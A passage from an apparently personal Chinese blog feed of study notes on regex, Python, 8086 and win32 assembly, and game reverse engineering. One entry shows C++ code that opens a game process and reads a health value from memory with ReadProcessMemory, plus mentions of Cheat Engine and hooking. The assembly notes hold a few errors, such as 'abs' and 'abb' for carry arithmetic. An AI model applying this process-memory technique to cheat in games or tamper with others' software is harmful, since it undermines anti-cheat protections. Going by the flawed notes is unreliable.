src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/%E6%AD%A3%E5%88%99/image-20230801142113479.png" alt="image-20230801142113479"></p><p>下面是一个列题</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/%E6%AD%A3%E5%88%99/image-20230801142434498.png" alt="image-20230801142434498"></p></li><li><p>正向先行断言</p><p>先行都是判断词在后面，正向就是说符合匹配</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/%E6%AD%A3%E5%88%99/image-20230801142638894.png" alt="image-20230801142638894"></p></li><li><p>反向先行断言</p><p>先行都是判断词在后面，反向就是说不符合匹配</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/%E6%AD%A3%E5%88%99/image-20230801142928705.png" alt="image-20230801142928705"></p></li><li><p>正向后行断言</p><p>后行都是判断词在前面，正向就是说符合匹配</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/%E6%AD%A3%E5%88%99/image-20230801143053853.png" alt="image-20230801143053853"></p></li><li><p>反向后行断言</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/%E6%AD%A3%E5%88%99/image-20230801143358287.png" alt="image-20230801143358287"></p></li></ol><h2 id="小知识点补充"><a href="#小知识点补充" class="headerlink" title="小知识点补充"></a>小知识点补充</h2><ol><li><code>?</code>当遇到{}的时候，没有加<code>？</code>就是贪婪模式，也就是如果有的话会取到后面。非贪婪只会匹配最小值，后面符合都不会在匹配</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>web安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF名词积累</title>
    <link href="/2023/07/27/CTF/CTF%E5%90%8D%E8%AF%8D%E7%A7%AF%E7%B4%AF/"/>
    <url>/2023/07/27/CTF/CTF%E5%90%8D%E8%AF%8D%E7%A7%AF%E7%B4%AF/</url>
    
    <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ida的使用</title>
    <link href="/2023/07/24/%E9%80%86%E5%90%91/ida%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2023/07/24/%E9%80%86%E5%90%91/ida%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="IDA的使用"><a href="#IDA的使用" class="headerlink" title="IDA的使用"></a>IDA的使用</h1>]]></content>
    
    
    
    <tags>
      
      <tag>逆向</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>反外挂</title>
    <link href="/2023/07/24/%E9%80%86%E5%90%91/%E5%8F%8D%E5%A4%96%E6%8C%82/"/>
    <url>/2023/07/24/%E9%80%86%E5%90%91/%E5%8F%8D%E5%A4%96%E6%8C%82/</url>
    
    <content type="html"><![CDATA[<h1 id="逆向分析入门"><a href="#逆向分析入门" class="headerlink" title="逆向分析入门"></a>逆向分析入门</h1><h2 id="搜索血量-主要是使用CE软件"><a href="#搜索血量-主要是使用CE软件" class="headerlink" title="搜索血量(主要是使用CE软件)"></a>搜索血量(主要是使用CE软件)</h2><h3 id="内存搜索"><a href="#内存搜索" class="headerlink" title="内存搜索"></a>内存搜索</h3><ol><li><p>内存的分类</p><p>物理内存和虚拟内存</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/reverse/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/image-20230724100903047.png" alt="image-20230724100903047"></p><p>每一个进程都都有自己的专属的内存的，所以我们使用CE就可可以查看到对应的虚拟内存</p></li><li><p>使用CE搜索看不到的数据</p><p>通过搜索一个整体相关的内存，进行内存分析</p><p>通过类型进行判断分析内存的信息 </p></li><li><p>使用cpp探索血量</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br>   <br>   <br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br>   <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    DWORD pid;<br>    <span class="hljs-type">int</span> HP&#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;请输入游戏的进程: &quot;</span> &lt;&lt; std::endl;<br>        std::cin &gt;&gt; pid;<br>        HANDLE hProcess = <span class="hljs-built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, pid);<br>        <span class="hljs-keyword">if</span> (hProcess) &#123;<br>            SIZE_T readByte&#123;<span class="hljs-number">0</span>&#125;;<br>            BOOL BRet = <span class="hljs-built_in">ReadProcessMemory</span>(hProcess, (LPVOID) <span class="hljs-number">0x004B6CC4</span>, &amp;HP, <span class="hljs-built_in">sizeof</span>(HP), &amp;readByte);<br>            <span class="hljs-keyword">if</span> (BRet) &#123;<br>                std::cout &lt;&lt; <span class="hljs-string">&quot;血量是：&quot;</span> &lt;&lt; HP &lt;&lt; std::endl;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                std::cout &lt;&lt; <span class="hljs-string">&quot;读取错误&quot;</span> &lt;&lt; std::endl;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            std::cout &lt;&lt; <span class="hljs-string">&quot;open process error &quot;</span> &lt;&lt; std::endl;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>HOOK技术</p><p>修改程序的执行流程的技术</p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>逆向</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内存池</title>
    <link href="/2023/07/23/CPP%E5%BC%80%E5%8F%91%E7%BB%84%E4%BB%B6/%E5%86%85%E5%AD%98%E6%B1%A0/"/>
    <url>/2023/07/23/CPP%E5%BC%80%E5%8F%91%E7%BB%84%E4%BB%B6/%E5%86%85%E5%AD%98%E6%B1%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="内存池（slab）"><a href="#内存池（slab）" class="headerlink" title="内存池（slab）"></a>内存池（slab）</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ol><li>&#96;</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>CPP开发组件</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF技巧</title>
    <link href="/2023/07/20/CTF/CTF%E6%8A%80%E5%B7%A7/"/>
    <url>/2023/07/20/CTF/CTF%E6%8A%80%E5%B7%A7/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h1><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><ol><li><p><code>xls</code>都当成ZIP解压。</p></li><li><p><code>Rc4</code>加密，解密。</p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>tython随记</title>
    <link href="/2023/07/19/python/tython%E9%9A%8F%E8%AE%B0/"/>
    <url>/2023/07/19/python/tython%E9%9A%8F%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="python的小数打印"><a href="#python的小数打印" class="headerlink" title="python的小数打印"></a>python的小数打印</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># print(&quot;%.2f&quot;%intNum)</span><br><span class="hljs-comment"># print(f&#x27;&#123;intNum:.2f&#125;&#x27;)</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#123;:.2f&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(intNum))<br></code></pre></td></tr></table></figure><h1 id="控制进制"><a href="#控制进制" class="headerlink" title="控制进制"></a>控制进制</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">str16=<span class="hljs-built_in">input</span>()<br><br>int16=<span class="hljs-built_in">int</span>(str16,<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>8086随记</title>
    <link href="/2023/07/19/%E6%B1%87%E7%BC%96/8086%E9%9A%8F%E8%AE%B0/"/>
    <url>/2023/07/19/%E6%B1%87%E7%BC%96/8086%E9%9A%8F%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<ol><li><p>段地址和偏移地址</p><blockquote><p>段地址是一个16位的值，用于表示内存中的段（Segment）。每个段都有一个唯一的段地址，用于标识该段在内存中的位置。段地址乘以16后，得到段在内存中的起始地址。</p><p>偏移地址是一个16位的值，用于表示相对于段起始地址的偏移量。偏移地址指定了从段起始地址开始的具体位置。</p></blockquote></li><li><p>每个段地址都会相差16个字节</p></li><li><p>汇编代码里面是不区分大小写</p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>汇编</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>汇编扫盲</title>
    <link href="/2023/07/16/%E6%B1%87%E7%BC%96/%E6%B1%87%E7%BC%96%E6%89%AB%E7%9B%B2/"/>
    <url>/2023/07/16/%E6%B1%87%E7%BC%96/%E6%B1%87%E7%BC%96%E6%89%AB%E7%9B%B2/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="汇编扫盲"><a href="#汇编扫盲" class="headerlink" title="汇编扫盲"></a>汇编扫盲</h1><h2 id="lea"><a href="#lea" class="headerlink" title="lea"></a>lea</h2><ol><li>用于取指针的地址</li></ol><h2 id="invoke"><a href="#invoke" class="headerlink" title="invoke"></a>invoke</h2><ol><li>用于调用函数，并且提供简单的方式传参数</li></ol><h2 id="offset"><a href="#offset" class="headerlink" title="offset"></a>offset</h2><ol><li><p>去变量的地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asm">invoke MessageBox, 0, offset message, offset title, MB_OK<br></code></pre></td></tr></table></figure></li></ol><h2 id="MASM-gt-addr"><a href="#MASM-gt-addr" class="headerlink" title="MASM-&gt;addr"></a>MASM-&gt;addr</h2><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716103420836.png" alt="image-20230716103420836"></p><h2 id="ASSUME"><a href="#ASSUME" class="headerlink" title="ASSUME"></a><code>ASSUME</code></h2><ol><li><p>ASSUME指令的作用是将一个段寄存器与一个段名进行关联。它告诉汇编器，当遇到使用该段寄存器的指令时，应该将其解释为对应的段名。这样，在编写程序时，我们可以直接使用段寄存器，而不需要显式地指定段名。</p></li><li><p>使用完后记得<code>mothing</code>一下</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717153055004.png" alt="image-20230717153055004"></p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>汇编</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>8086汇编</title>
    <link href="/2023/07/15/%E6%B1%87%E7%BC%96/8086%E6%B1%87%E7%BC%96/"/>
    <url>/2023/07/15/%E6%B1%87%E7%BC%96/8086%E6%B1%87%E7%BC%96/</url>
    
    <content type="html"><![CDATA[<p>8086入门学习</p><h1 id="8086汇编代码"><a href="#8086汇编代码" class="headerlink" title="8086汇编代码"></a>8086汇编代码</h1><h2 id="使用debug"><a href="#使用debug" class="headerlink" title="使用debug"></a>使用debug</h2><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230719181638022.png" alt="image-20230719181638022"></p><ol><li><p>在终端中输入<code>debug</code>进入到调式界面</p></li><li><p>查看寄存器输入<code>R</code></p><ul><li><code>r+寄存器变量名</code>直接修改寄存器的值</li></ul></li><li><p>查看内存输入<code>D</code> </p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230719182834156.png" alt="image-20230719182834156"></p><ul><li><p>也可以添加地址，从1000段地址偏移0开始输出 </p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230719182309364.png" alt="image-20230719182309364"></p></li></ul></li><li><p>改变内存的内容<code>E</code></p><ul><li><p>第一种方法</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230719182659159.png" alt="image-20230719182659159"></p></li><li><p>第二种方法</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230719183431008.png" alt="image-20230719183431008"></p></li></ul></li><li><p>使用<code>A</code>添加汇编代码</p></li><li><p><code>T</code>执行插入的指令</p></li><li><p><code>U</code>翻译机器码</p></li></ol><h2 id="部分寄存器"><a href="#部分寄存器" class="headerlink" title="部分寄存器"></a>部分寄存器</h2><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230722085403982.png" alt="image-20230722085403982"></p><h2 id="指令的学习"><a href="#指令的学习" class="headerlink" title="指令的学习"></a>指令的学习</h2><h3 id="mov"><a href="#mov" class="headerlink" title="mov"></a><code>mov</code></h3><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230720151104219.png" alt="image-20230720151104219"></p><ol><li><p>注意逗号后面的控制</p></li><li><p>下面操作寄存器的高位和低位</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230720151249768.png" alt="image-20230720151249768"></p><p>注意第三条指令(不包括错误的指令)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ch, 10<br></code></pre></td></tr></table></figure><p>这段代码表示将10给c寄存器的高位（hight）</p><p>由此可以知道直接使用<code>mov</code>直接赋值给低地址位</p></li></ol><h3 id="add"><a href="#add" class="headerlink" title="add"></a><code>add</code></h3><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230720152313629.png" alt="image-20230720152313629"></p><ol><li><p>将两个数相加</p></li><li><p>同时也可以实现自己加自己</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230720152634451.png" alt="image-20230720152634451"></p></li><li><p>相加如果越位了就直接舍去</p></li><li><p>如使用地位相加过后溢位了</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230720153048935.png" alt="image-20230720153048935"></p><p>同样的不会进位</p><p>但是使用的是整个的寄存器那么就会进位</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230720153203861.png" alt="image-20230720153203861"></p></li></ol><h3 id="sub"><a href="#sub" class="headerlink" title="sub"></a><code>sub</code></h3><ol><li><p>sub会向下越界</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230722083756095.png" alt="image-20230722083756095"></p></li><li><p>同样的如果是操作低位或高位，只会在低位或者高位进行sub计算</p></li></ol><h3 id="mul"><a href="#mul" class="headerlink" title="mul"></a><code>mul</code></h3><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230722085536634.png" alt="image-20230722085536634"></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230722085647601.png" alt="image-20230722085647601"></p><ol><li><p>首先应该知道</p><p>乘数一个是放<code>ax</code>或者<code>al</code>当中的，另一个是自己指定的</p></li><li><p>存放的时候默认放在<code>ax</code>，如果是16位的乘法，高位就放在<code>dx</code></p></li></ol><p><code>div</code></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230722090833052.png" alt="image-20230722090833052"></p><ol><li><p>除数相当于是我们指定的</p><p>被除数要分情况，被除数是16位放在<code>ax</code>当中；是<code>32</code>就放在<code>dx</code>和<code>ax</code>当中，高位放在<code>dx</code>地位放在<code>ax</code></p></li><li><p>结果的从存放。</p><p>高位放余数，低位放置商</p></li></ol><p><code>and</code></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230722091746751.png" alt="image-20230722091746751"></p><ol><li><p>有<code>0</code>就是<code>0</code></p></li><li><p>下面演示操作方法</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230722092236392.png" alt="image-20230722092236392"></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230722092457283.png" alt="image-20230722092457283"></p></li></ol><p><code>or</code></p><ol><li>有<code>1</code>就是<code>1</code></li><li>但是在<code>debug</code>界面我们不能使用二进制，所以先要转换成16进制才能计算二进制</li></ol><h3 id="左右移的指令"><a href="#左右移的指令" class="headerlink" title="左右移的指令"></a><code>左右移的指令</code></h3><ol><li>移动都是移动的是二进制</li></ol><h4 id="shl左移"><a href="#shl左移" class="headerlink" title="shl左移"></a><code>shl</code>左移</h4><ol><li><p>和C语言的一致，向左移动，然后右边补<code>0</code></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230722093511339.png" alt="image-20230722093511339"></p></li></ol><h4 id="rol循环左移"><a href="#rol循环左移" class="headerlink" title="rol循环左移"></a><code>rol</code>循环左移</h4><ol><li>将高位舍去的位数补充到低位</li></ol><h4 id="shr右移"><a href="#shr右移" class="headerlink" title="shr右移"></a><code>shr</code>右移</h4><h4 id="ror循环右移"><a href="#ror循环右移" class="headerlink" title="ror循环右移"></a><code>ror</code>循环右移</h4><h3 id="inc自增操作"><a href="#inc自增操作" class="headerlink" title="inc自增操作"></a><code>inc</code>自增操作</h3><h3 id="dec自减操作"><a href="#dec自减操作" class="headerlink" title="dec自减操作"></a><code>dec</code>自减操作</h3><h3 id="nop空的代码段"><a href="#nop空的代码段" class="headerlink" title="nop空的代码段"></a><code>nop</code>空的代码段</h3><ol><li>大小为一个字节</li><li>可以用存放代码段</li></ol><h3 id="xchg交换"><a href="#xchg交换" class="headerlink" title="xchg交换"></a><code>xchg</code>交换</h3><ol><li>可以用于交换两个数，寄存器或者地址</li></ol><h3 id="neg取反"><a href="#neg取反" class="headerlink" title="neg取反"></a><code>neg</code>取反</h3><ol><li>用于将二进制取反操作</li></ol><h3 id="abs带进位的加法"><a href="#abs带进位的加法" class="headerlink" title="abs带进位的加法"></a><code>abs</code>带进位的加法</h3><ol><li>利用的是cf寄存器</li></ol><h3 id="abb带借位的一个减法"><a href="#abb带借位的一个减法" class="headerlink" title="abb带借位的一个减法"></a><code>abb</code>带借位的一个减法</h3><ol><li>使用的也是cf寄存器</li></ol><h3 id="cmp是比较，也是减法"><a href="#cmp是比较，也是减法" class="headerlink" title="cmp是比较，也是减法"></a><code>cmp</code>是比较，也是减法</h3><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230722170544073.png" alt="image-20230722170544073"></p><p>通过相减看是否是相等的</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230722171803628.png" alt="image-20230722171803628"></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230722172100724.png" alt="image-20230722172100724"></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230722172133543.png" alt="image-20230722172133543"></p><h3 id="call和ret"><a href="#call和ret" class="headerlink" title="call和ret"></a><code>call</code>和<code>ret</code></h3><ol><li><p>通过修改cx的值进行跳转</p></li><li><p><code>call</code>相当于函数的调用</p></li><li><p><code>ret</code>用于函数的结束</p></li><li><p>但是整体的结束是INT 21H</p></li><li><p>CALL 和  RET的都是修改IP的值，也就是说是近转移</p></li><li><p>CALLF和RETF就是说是远转移，如果通过修改IP不能达到要求，则会修改 CX</p></li><li><p>本质都是压栈和弹栈的过程</p><p>CALL是压栈，将代码的地址压栈</p><p>RET是出栈，将代码的地址</p></li></ol><h3 id="offset读取一个函数的地址，然后赋值"><a href="#offset读取一个函数的地址，然后赋值" class="headerlink" title="offset读取一个函数的地址，然后赋值"></a>offset读取一个函数的地址，然后赋值</h3><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230723123016835.png" alt="image-20230723123016835"></p><ol><li>获取一个函数的地址，然后进行操作</li></ol><h3 id="lea"><a href="#lea" class="headerlink" title="lea"></a><code>lea</code></h3><ol><li>计算有效地址：<code>lea</code> 可以计算一个内存操作数的有效地址，并将结果（即内存地址）加载到目标寄存器中。例如，<code>lea eax, [ebx+ecx*4]</code> 将计算 <code>[ebx+ecx*4]</code> 的有效地址，并将结果存储到寄存器 <code>eax</code> 中。</li><li>进行简单的加法运算：<code>lea</code> 可以执行简单的加法运算，并将结果加载到目标寄存器中。例如，<code>lea eax, [ebx+123]</code> 将 <code>ebx+123</code> 的结果计算出来，并将结果存储到寄存器 <code>eax</code> 中。</li></ol><h2 id="终断"><a href="#终断" class="headerlink" title="终断"></a>终断</h2><ol><li>程序停止就是中断</li></ol><h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><h3 id="段地址和偏移地址"><a href="#段地址和偏移地址" class="headerlink" title="段地址和偏移地址"></a>段地址和偏移地址</h3><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230722100913434.png" alt="image-20230722100913434"></p><ol><li><p>一个物理地址可以有很多个段地址加偏移地址的组合 </p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230722101449853.png" alt="image-20230722101449853"></p></li><li><p>下面演示使用DS（数据段地址）+偏移地址给ax赋值</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230722102553160.png" alt="image-20230722102553160"></p><p>注意标红的地方就是使用的偏移地址</p></li><li><p>不通过<code>r</code>修改DS寄存器</p><p>由于DOS的限制，不能直接使用MOV修改DS寄存器</p><p>但是可以使用下面的例子对DS赋值</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230722103018201.png" alt="image-20230722103018201"></p><p>我们先将值赋给AX然后在对其赋值</p></li></ol><h3 id="CS和IP-代码段寄存器"><a href="#CS和IP-代码段寄存器" class="headerlink" title="CS和IP   代码段寄存器"></a>CS和IP   代码段寄存器</h3><p>代码运行地址</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230722104944573.png" alt="image-20230722104944573"></p><ol><li><p>物理的内存等于</p><p>​CS*16+IP&#x3D;内存</p></li><li><p>下面使用实例</p><ul><li><p>先将规定地址，在添加汇编代码</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230722105649871.png" alt="image-20230722105649871"></p></li><li><p>使用U将机器码翻译成汇编代码</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230722105723077.png" alt="image-20230722105723077"></p></li></ul></li><li><p>注意</p><p><strong>如果要指定一段地址运行，需要修改CS和IP的数值</strong></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230722114949873.png" alt="image-20230722114949873"></p></li></ol><h3 id="jump指令"><a href="#jump指令" class="headerlink" title="jump指令"></a><code>jump</code>指令</h3><ol><li><p>用于不同内存的跳转</p><p>下面的实现在1E2B:0100运行mov ax,8989</p><p>然后使用jump与运行jump1000:0000</p><p>运行move bx,1212</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230722125003980.png" alt="image-20230722125003980"></p><p>注意在编写的时候我们需要手动跳转内存进行写代码</p></li></ol><h3 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h3><ol><li><p>先进后出，后进先出</p></li><li><p>压栈</p><blockquote><p>将ax,bx,cx压入栈</p></blockquote><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230722130358149.png" alt="image-20230722130358149"></p></li><li><p>出栈</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230722130541365.png" alt="image-20230722130541365"></p></li><li><p>寻址的实现</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230722131010719.png" alt="image-20230722131010719"></p><p>我们通过记录段地址用SS，使用SP记录偏移的地址</p></li><li><p>栈的越界</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230722131701530.png" alt="image-20230722131701530"></p><p>也就是说，计算机不会检测，需要人为的注意栈区的大小</p></li></ol><h3 id="寻址方式"><a href="#寻址方式" class="headerlink" title="寻址方式"></a>寻址方式</h3><ol><li>使用偏移地址的方式<ul><li>首先使用CS进行段地址的赋值</li><li>然后使用偏移地址的方式查找</li><li>注意BX寄存器也是可以用来当作偏移地址</li></ul></li></ol><h3 id="SI和DI"><a href="#SI和DI" class="headerlink" title="SI和DI"></a><code>SI</code>和<code>DI</code></h3><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230722155845770.png" alt="image-20230722155845770"></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230722160118625.png" alt="image-20230722160118625"></p><h3 id="BX-寄存器BX的替代品"><a href="#BX-寄存器BX的替代品" class="headerlink" title="BX 寄存器BX的替代品"></a>BX 寄存器BX的替代品</h3><ol><li>代表了以SS:BP</li><li>可以用于寻址</li><li>同时还可以使用<code>.</code>表示偏移地址</li></ol><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230722161253506.png" alt="image-20230722161253506"></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230722161405353.png" alt="image-20230722161405353"></p><h3 id="ES附加段寄存器"><a href="#ES附加段寄存器" class="headerlink" title="ES附加段寄存器"></a><code>ES</code>附加段寄存器</h3><p>相当于备胎，和其他的差不多</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230722161635034.png" alt="image-20230722161635034"></p><h3 id="标志寄存器"><a href="#标志寄存器" class="headerlink" title="标志寄存器"></a>标志寄存器</h3><h2 id="比较器，相当于c-的if"><a href="#比较器，相当于c-的if" class="headerlink" title="比较器，相当于c++的if"></a>比较器，相当于c++的if</h2><h2 id="段"><a href="#段" class="headerlink" title="段"></a>段</h2><h3 id="代码段"><a href="#代码段" class="headerlink" title="代码段"></a>代码段</h3><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230722172758881.png" alt="image-20230722172758881" style="zoom:150%;" /><ol><li><p>注意我们需要先将cs指定，也就是code segment</p><p>还需要将codesg ends 结尾</p></li></ol><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><h3 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h3><ol><li>使用loop进行循环</li><li>根据CX的值是否为0，进行判断是否是可行的</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>汇编</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>win32汇编</title>
    <link href="/2023/07/15/%E6%B1%87%E7%BC%96/win32%E6%B1%87%E7%BC%96/"/>
